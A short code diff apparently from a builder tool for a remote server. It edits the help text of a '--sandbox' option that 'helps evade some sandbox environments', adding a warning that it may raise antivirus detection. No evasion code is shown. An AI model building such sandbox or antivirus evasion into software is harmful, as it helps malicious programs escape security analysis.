@@ -217,7 +217,7 @@ def parse_arguments():
     parser.add_argument('--linux', dest="linux",
                         action="store_true", default=False, help="Builds the server for linux")
     parser.add_argument('--sandbox', dest="sandbox",
-                        action="store_true", default=False, help="Helps evade some sandbox environments. Requires internet access, otherwise it fails.")
+                        action="store_true", default=False, help="Helps evade some sandbox environments. Requires internet access, otherwise it fails. This may increase AV detection")
 
     args = parser.parse_args()
     try:
